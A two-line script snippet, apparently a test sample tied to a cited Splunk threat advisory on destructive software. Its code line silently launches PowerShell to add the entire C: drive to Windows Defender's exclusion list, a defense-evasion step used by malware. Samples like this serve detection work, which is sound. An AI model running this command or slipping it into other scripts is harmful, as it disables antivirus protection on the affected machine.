'https://www.splunk.com/en_us/blog/security/threat-advisory-strt-ta02-destructive-software.html
CreateObject("WScript.Shell").Run "powershell Set-MpPreference -ExclusionPath 'C:\'", 0, False